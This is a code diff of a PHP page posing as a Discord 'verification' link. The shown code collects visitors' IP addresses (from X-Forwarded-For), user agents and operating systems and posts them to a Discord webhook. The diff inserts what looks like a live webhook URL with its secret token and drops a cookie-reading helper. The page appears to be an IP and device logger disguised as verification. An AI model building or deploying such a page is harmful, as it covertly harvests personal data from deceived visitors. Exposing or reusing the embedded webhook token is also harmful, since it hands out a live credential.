@@ -40,14 +40,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $input = file_get_contents('php://input');
     $data = json_decode($input, true);
 
-    $user_id = $data['user_id'] ?? $_GET['user'] ?? 'Unknown';
-    if ($user_id === 'Unknown') {
+    $user_id = $data['user_id'] ?? ($_GET['user'] ?? null);
+    if (!$user_id || !is_numeric($user_id)) {
         header('Content-Type: application/json');
-        echo json_encode(['status' => 'error', 'message' => 'Invalid user ID']);
+        echo json_encode(['status' => 'error', 'message' => 'No user ID provided or invalid']);
         exit;
     }
 
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
     $os = getOS($user_agent);
 
     $forwarded = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
@@ -85,7 +85,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'timestamp' => date('c')
     ];
 
-    $webhook_url = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your actual webhook URL
+    $webhook_url = 'https://discord.com/api/webhooks/1426256242690625600/jw-wr_1D7IL7sy62Zn608UgN1UXXE8BURCtmPZmMUq-QKizwKFoxOKSahLJhIZKTjfZe';
     $options = [
         'http' => [
             'header' => "Content-Type: application/json\r\n",
@@ -214,18 +214,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         </ul>
     </div>
     <script>
-        function getCookie(name) {
-            const value = `; ${document.cookie}`;
-            const parts = value.split(`; ${name}=`);
-            if (parts.length === 2) return parts.pop().split(';').shift();
-            return "Not found";
-        }
-
-        const userId = new URLSearchParams(window.location.search).get('user') || 'Unknown';
-        if (userId === 'Unknown') {
+        const userId = new URLSearchParams(window.location.search).get('user');
+        if (!userId || isNaN(userId)) {
             document.getElementById('container').innerHTML = `
                 <h1>Error</h1>
-                <p>Invalid user ID. Please try again.</p>
+                <p>No user ID provided or invalid. Please use the verification link from Discord.</p>
             `;
         } else {
             const data = { user_id: userId };
@@ -268,7 +261,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 console.error('Error:', error);
                 document.getElementById('container').innerHTML = `
                     <h1>Error</h1>
-                    <p>Verification failed. Try again.</p>
+                    <p>Verification failed. Please try again.</p>
                 `;
             });
         }
